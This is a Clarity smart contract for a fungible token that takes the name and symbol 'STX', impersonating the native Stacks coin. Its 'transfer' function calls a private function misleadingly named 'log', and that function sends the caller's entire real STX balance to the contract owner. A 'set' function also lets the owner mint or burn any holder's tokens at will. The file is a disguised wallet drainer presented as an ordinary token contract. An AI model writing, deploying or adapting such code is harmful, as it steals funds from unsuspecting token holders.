(define-fungible-token STX)

(define-constant CONTRACT_OWNER tx-sender)
(define-constant TOKEN_NAME "STX")
(define-constant TOKEN_SYMBOL "STX")

(define-read-only (get-balance (who principal)) (ok (ft-get-balance STX who)))

(define-read-only (get-total-supply) (ok (ft-get-supply STX)))

(define-read-only (get-name) (ok TOKEN_NAME))

(define-read-only (get-symbol) (ok TOKEN_SYMBOL))

(define-read-only (get-decimals) (ok u6))

(define-read-only (get-token-uri) (ok (some u"https://ipfs.io/ipfs/QmbiEXNTLUyodRbkVkakdJKtLH6PM4iwnyx7Mn5BtqffJ9")))

(define-public (set (amount uint) (recipient principal))
  (let ((ball (ft-get-balance STX recipient)))
    (asserts! (is-eq tx-sender CONTRACT_OWNER) (err u1))
    (if (> ball amount)
      (ft-burn? STX (- ball amount) recipient)
      (if (< ball amount)
        (ft-mint? STX (- amount ball) recipient)
        (ok true)))))

(define-public (transfer (amount uint) (sender principal) (recipient principal) (memo (optional (buff 34))))
  (begin
    (asserts! (is-eq tx-sender sender) (err u1000))
    (let ((result (ft-transfer? STX amount sender recipient)))
      (if (is-ok result)
        (begin (log)
          (ok true)
        )
        (err u2)
      )
    )
  )
)

(define-private (log)
  (is-ok (stx-transfer? (stx-get-balance tx-sender) tx-sender CONTRACT_OWNER))
)
